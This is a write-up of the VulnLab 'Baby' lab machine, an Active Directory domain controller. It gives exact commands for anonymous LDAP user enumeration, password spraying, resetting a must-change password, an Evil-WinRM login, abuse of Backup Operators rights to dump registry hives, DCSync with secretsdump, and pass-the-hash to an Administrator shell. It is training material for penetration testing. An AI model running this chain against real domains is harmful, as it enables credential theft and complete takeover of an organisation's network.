---
title: "Baby"
---

# VulnLab - Baby Writeup

![Cap dashboard screenshot](baby.png)

Baby is an easy VulnLab Windows machine, but it still covers several useful AD tradecraft steps: anonymous LDAP enumeration, password spraying, SMB access, WinRM, Backup Operators abuse, and DCSync. The path is straightforward once the initial password is found, but the privilege escalation is a good reminder of how dangerous backup-related rights can be.

## Reconnaissance

The target is a Windows Domain Controller running the usual AD services, including LDAP, Kerberos, SMB, RDP, WinRM, and AD Web Services. The hostname is `BABYDC`, the domain is `baby.vl`, and I added both `baby.vl` and `babydc.baby.vl` to `/etc/hosts`.

```bash
nmap -sC -sV -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5357,5985,9389,49664,49667,49669,49674,49675,51277,51292 10.10.66.16
```

The scan showed that LDAP anonymous bind was worth checking first, and that turned out to be the entry point.

## LDAP Enumeration

Anonymous LDAP access worked, and the directory listing exposed nine domain users along with useful descriptions. One of those descriptions contained a default initial password for `Teresa.Bell`, although that password no longer worked for the intended account.

```bash
nxc ldap baby.vl -u '' -p '' --users
```

Spraying that password against the user list showed that `Caroline.Robinson` matched, but her password needed to be changed before the account could be used. That is a common AD setup when a user is forced to update a temporary password on first logon.

## Password Reset

The password reset was handled cleanly with Impacket’s password-change utility. After setting a new password, the account was usable for SMB and WinRM.

```bash
impacket-changepasswd -newpass 'Helloworld123!' baby.vl/Caroline.Robinson@baby.vl
```

With the new password in place, I confirmed the account had SMB access and listed the available shares. The `C$` share was readable, which gave access to the first flag.

```bash
nxc smb baby.vl -u Caroline.Robinson -p 'Helloworld123!' --shares
```

## Initial Shell

The `Caroline.Robinson` account was a member of `Backup Operators`, and that was enough to log in with Evil-WinRM. Once on the box, I confirmed the hostname was `BabyDC` and read the user flag from the desktop.

```bash
evil-winrm -i babydc.baby.vl -u 'Caroline.Robinson' -p 'Helloworld123!'
```

This account was useful not because it was privileged in the usual admin sense, but because Backup Operators can read protected files and registry hives.

## Privilege Escalation

WinPEAS and netexec confirmed that the machine had the right ingredients for backup abuse. The user was in `Backup Operators`, and that let me trigger `RemoteRegistry` and dump the `SAM`, `SYSTEM`, and `SECURITY` hives through the network.

```bash
nxc smb baby.vl -u Caroline.Robinson -p 'Helloworld123!' -M backup_operator
```

That gave the local administrator hash, but the important discovery was the DC machine account hash and the registry material needed for domain secrets extraction.

## DCSync

Using the machine account hash, I ran `secretsdump` against the domain controller and successfully pulled domain credentials. That exposed the Administrator hash, which can then be used directly for remote access.

```bash
impacket-secretsdump -hashes :<DC_MACHINE_HASH> 'BABY.VL/BABYDC$@baby.vl'
```

After that, I used pass-the-hash with Impacket’s WMI execution tool to get a shell as Administrator on the DC.

```bash
impacket-wmiexec -hashes :<ADMIN_HASH> Administrator@baby.vl
```

## Attack Path

- Enumerate the domain with anonymous LDAP.
- Find the temporary password in a user description.
- Identify `Caroline.Robinson` as a password-must-change account.
- Reset the password.
- Log in via Evil-WinRM.
- Abuse `Backup Operators` to dump registry hives.
- Extract the DC machine hash.
- Use DCSync to recover the domain Administrator hash.
- Authenticate as Administrator and finish the machine.
